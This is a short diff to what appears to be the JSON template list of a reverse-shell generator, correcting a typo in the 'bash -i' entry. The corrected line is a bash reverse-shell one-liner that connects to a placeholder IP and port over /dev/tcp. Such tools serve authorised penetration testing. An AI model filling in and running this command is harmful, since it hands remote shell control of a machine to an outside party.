@@ -2,7 +2,7 @@
 	"Linux": [
 		{
 			"name": "bash -i",
-			"command": "{SHELL} -i >& /dev/tcp/{IP}/{PORT} 0>&1zzzzzzz"
+			"command": "{SHELL} -i >& /dev/tcp/{IP}/{PORT} 0>&1"
 		},
 		{
 			"name": "bash 196", 
